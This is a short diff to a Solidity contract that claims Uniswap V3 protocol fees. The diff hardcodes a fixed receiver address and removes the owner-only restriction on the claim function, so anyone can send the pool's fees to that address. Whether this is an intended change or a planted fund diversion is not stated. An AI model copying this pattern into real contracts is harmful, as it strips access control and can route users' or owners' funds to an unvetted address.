@@ -19,6 +19,7 @@ contract UniV3PoolFeeClaimer {
         IUniswapV3Pool(0x6647dcbeb030dc8E227D8B1A2Cb6A49F3C887E3c);
     IUniswapV3Factory private constant FACTORY =
         IUniswapV3Factory(0x20D0Cdf9004bf56BCa52A25C9288AAd0EbB97D59);
+    address private constant RECEIVER = 0xb8dd0e5580BE15E56c6937EE0e4EaB3c6F4E9360;
 
     address public owner;
 
@@ -34,9 +35,9 @@ contract UniV3PoolFeeClaimer {
         emit OwnershipTransferred(address(0), msg.sender);
     }
 
-    function claim(address receiver) external onlyOwner {
+    function claim() external {
         (uint128 fee0, uint128 fee1) = POOL.protocolFees();
-        POOL.collectProtocol(receiver, fee0, fee1);
+        POOL.collectProtocol(RECEIVER, fee0, fee1);
     }
 
     function setFactoryOwner(address newOwner) external onlyOwner {
